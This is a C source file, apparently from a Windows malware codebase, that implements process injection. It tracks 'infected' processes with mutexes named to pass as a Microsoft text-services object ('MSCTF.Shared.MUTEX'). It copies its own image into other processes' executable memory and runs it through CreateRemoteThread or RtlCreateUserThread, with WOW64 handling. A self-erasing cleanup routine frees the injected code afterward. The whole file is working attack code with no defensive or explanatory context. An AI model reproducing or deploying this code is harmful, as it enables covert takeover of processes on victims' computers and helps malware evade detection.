#include "hookapi.h"
#include "inject.h"
#include "crc32.h"
#include "system.h"
#include "inject.h"
#include "mem.h"
#include <shlwapi.h>
#include <ntdll.h>
#include <intrin.h>

_IsWow64Process *lpIsWow64Process;
bool bWOW64=false;
TCHAR szMutexFormat[]=TEXT("MSCTF.Shared.MUTEX.%08x"),szNtdll[]=TEXT("ntdll.dll");
typedef NTSTATUS WINAPI __RtlCreateUserThread(HANDLE ProcessHandle,PSECURITY_DESCRIPTOR SecurityDescriptor,BOOLEAN CreateSuspended,ULONG StackZeroBits,PULONG StackReserved,PULONG StackCommit,PVOID StartAddress,PVOID StartParameter,PHANDLE ThreadHandle,LPVOID ClientID);

__RtlCreateUserThread *pRtlCreateUserThread;
Wow64InjectProc *InjectWOW64=NULL;
bool bInitInjector=false;
void InitInjector(Wow64InjectProc *lpWOW64Proc)
{
    if (bInitInjector)
        return;
    bInitInjector=true;
    chksum_crc32gentab();
    lpImage=ldr_GetImageBase(ldr_GetOurAddr());
    ldr_GetImageSize();
    if (lpWOW64Proc)
    {
        InjectWOW64=lpWOW64Proc;
        lpIsWow64Process=(_IsWow64Process *)GetProcAddress(GetModuleHandle(szNtdll),"IsWow64Process");
    }
    MarkProcessAsInfected(GetCurrentProcessId());
    pRtlCreateUserThread=(__RtlCreateUserThread *)GetProcAddress(GetModuleHandle(szNtdll),"RtlCreateUserThread");
    return;
}

bool IsProcessInfected(DWORD dwPID)
{
    DWORD dwHash=chksum_crc32((byte*)&dwPID,sizeof(dwPID));
    TCHAR szMutex[40];
    wsprintf(szMutex,szMutexFormat,dwHash);
    HANDLE hMutex=OpenMutex(MUTEX_ALL_ACCESS,false,szMutex);
    if (hMutex)
    {
        SysCloseHandle(hMutex);
        return true;
    }
    return false;
}

HANDLE MarkProcessAsInfected(DWORD dwPID)
{
    DWORD dwHash=chksum_crc32((byte*)&dwPID,sizeof(dwPID));
    TCHAR szMutex[40];
    wsprintf(szMutex,szMutexFormat,dwHash);
    HANDLE hMutex=OpenMutex(MUTEX_ALL_ACCESS,false,szMutex);
    if (!hMutex)
        hMutex=CreateMutex(NULL,false,szMutex);
    return hMutex;
}

bool IsKernelLoaded(DWORD ProcessId)
{
    HANDLE hSnap;
    bool Result=false;

    do
    {
        hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,ProcessId);
        if (hSnap == INVALID_HANDLE_VALUE)
        {
            if (GetLastError() == ERROR_BAD_LENGTH)
            {
                SwitchToThread();

                hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,ProcessId);
                if (hSnap == INVALID_HANDLE_VALUE)
                    break;
            }
            break;
        }

        MODULEENTRY32 ModEnt={0};
        ModEnt.dwSize=sizeof(ModEnt);

        if (!Module32First(hSnap,&ModEnt))
            break;

        do
        {
            TCHAR *TempStr=StrStrI(ModEnt.szModule,TEXT("kernel"));
            if ((TempStr) && (StrStrI(TempStr,TEXT(".dll"))))
            {
                Result=true;
                break;
            }
        }
        while (Module32Next(hSnap,&ModEnt));
    }
    while (false);

    if (hSnap != INVALID_HANDLE_VALUE)
        SysCloseHandle(hSnap);

    return Result;
}

bool IsThreadExecuted(DWORD dwPID,HANDLE hThread,HANDLE hProc)
{
    for (int i=0; i < 300; i++)
    {
        if (IsProcessInfected(dwPID))
        {
            SysCloseHandle(hProc);
            SysCloseHandle(hThread);
            return true;
        }
        Sleep(1);
    }
    TerminateThread(hThread,0);
    SysCloseHandle(hThread);
    return false;
}

HANDLE SysOpenProcess(DWORD dwAccess,DWORD_PTR dwPID)
{
    HANDLE hRes=NULL;
    PCLIENT_ID lpClientId=(PCLIENT_ID)VirtualAlloc(NULL,sizeof(CLIENT_ID),MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

    if (lpClientId)
    {
        lpClientId->UniqueProcess=(HANDLE)dwPID;
        lpClientId->UniqueThread=0;

        DWORD dwOldProtect;
        VirtualProtect(lpClientId,sizeof(CLIENT_ID),PAGE_READWRITE|PAGE_GUARD,&dwOldProtect);

        OBJECT_ATTRIBUTES ObjAttr;
        InitializeObjectAttributes(&ObjAttr,0,0,0,0);

        __try
        {
            if (!NT_SUCCESS(ZwOpenProcess(&hRes,dwAccess,&ObjAttr,lpClientId)))
                hRes=NULL;

            lpClientId->UniqueThread=0;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            hRes=NULL;}

        VirtualFree(lpClientId,0,MEM_RELEASE);
    }
    if (!hRes)
        hRes=OpenProcess(dwAccess,FALSE,dwPID);
    return hRes;
}

bool InjectProc(LPVOID lpFunction,DWORD dwPID,LPVOID lpParam)
{
    if (!IsProcessInfected(dwPID))
    {
        HANDLE hProc=SysOpenProcess(PROCESS_CREATE_THREAD+PROCESS_QUERY_INFORMATION+PROCESS_VM_OPERATION+PROCESS_VM_WRITE+PROCESS_VM_READ,dwPID);
        if (!hProc)
            return false;

        for (int i=0; i < SYSINJ_WAIT_ATTEMPTS; i++)
		{
			if (IsKernelLoaded(dwPID))
				break;

			Sleep(SYSINJ_WAIT_TIMEOUT);
		}

		if (!IsKernelLoaded(dwPID))
        {
            SysCloseHandle(hProc);
            return false;
        }

        if (lpIsWow64Process)
        {
#ifdef _AMD64_
            BOOL bWOW64Proc;
            lpIsWow64Process(hProc,&bWOW64Proc);

            if (bWOW64Proc)
            {
                if (InjectWOW64)
                {
                    SysCloseHandle(hProc);
                    return InjectWOW64(lpFunction,dwPID,lpParam);
                }
                else
                    return false;
            }
            else
                return false;
#else
            if (bWOW64)
            {
                BOOL bWOW64Proc;
                lpIsWow64Process(hProc,&bWOW64Proc);

                if (!bWOW64Proc)
                {
                    if (InjectWOW64)
                    {
                        SysCloseHandle(hProc);
                        return InjectWOW64(lpFunction,dwPID,lpParam);
                    }
                    else
                        return false;
                }
            }
            else
                return false;
#endif
        }

        void *lpMem=VirtualAllocEx(hProc,NULL,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        if (lpMem)
        {
            SIZE_T dwTmp;
            if (WriteProcessMemory(hProc,lpMem,lpImage,dwSize,&dwTmp))
            {
                lpFunction=(LPTHREAD_START_ROUTINE) ((SIZE_T)lpFunction-(SIZE_T)lpImage+(SIZE_T)lpMem);
                HANDLE hThread;
                if (hThread=CreateRemoteThread(hProc,NULL,0,(LPTHREAD_START_ROUTINE)lpFunction,lpParam,0,NULL))
                {
                    if (IsThreadExecuted(dwPID,hThread,hProc))
                        return true;
                }
                else if ((pRtlCreateUserThread) && (pRtlCreateUserThread(hProc,NULL,FALSE,0,0,0,lpFunction,lpParam,&hThread,0) >= 0))
                {
                    if (IsThreadExecuted(dwPID,hThread,hProc))
                        return true;
                }
            }
            VirtualFreeEx(hProc,lpMem,dwSize,MEM_DECOMMIT);
        }
        SysCloseHandle(hProc);
    }
    return false;
}

bool InjectWnd(LPTHREAD_START_ROUTINE lpFunction,HWND hWnd,LPVOID lpParam)
{
    DWORD dwPid;
    GetWindowThreadProcessId(hWnd,&dwPid);

    return InjectProc(lpFunction,dwPid,lpParam);
}

#pragma optimize("",off)
static void WINAPI MemCleanupThread(MEMINFO *lpMemInfo)
{
    if (lpMemInfo)
    {
        DWORD dwExitCode;
        do
        {
            lpMemInfo->lpGetExitCodeThread(lpMemInfo->hThread,&dwExitCode);
            Sleep(1);
        }
        while (dwExitCode == STILL_ACTIVE);

        lpMemInfo->lpVirtualFree(lpMemInfo->lpStartingAddress,0,MEM_DECOMMIT);
    }
    return;
}
static void MemCleanupThreadEnd(void)
{
}

void DestroyInject()
{
    MEMINFO *lpMemInfo=(MEMINFO*)MemAlloc(sizeof(MEMINFO));
    lpMemInfo->lpVirtualFree=(__VirtualFree*)VirtualFree;
    lpMemInfo->lpGetExitCodeThread=(__GetExitCodeThread*)GetExitCodeThread;
    lpMemInfo->lpStartingAddress=ldr_GetImageBase((byte*)_ReturnAddress());
    lpMemInfo->hThread=OpenThread(THREAD_QUERY_INFORMATION,false,GetCurrentThreadId());

    DWORD_PTR dwSize=(DWORD_PTR)MemCleanupThreadEnd-(DWORD_PTR)MemCleanupThread;
    LPVOID lpThread=MemAlloc(dwSize);
    memcpy(lpThread,MemCleanupThread,dwSize);
    DWORD tmp;
    VirtualProtect(lpThread,dwSize,PAGE_EXECUTE_READ,&tmp);

    SysCloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)lpThread,lpMemInfo,0,NULL));
    ExitThread(0xDEAD);
}
#pragma optimize("",on)


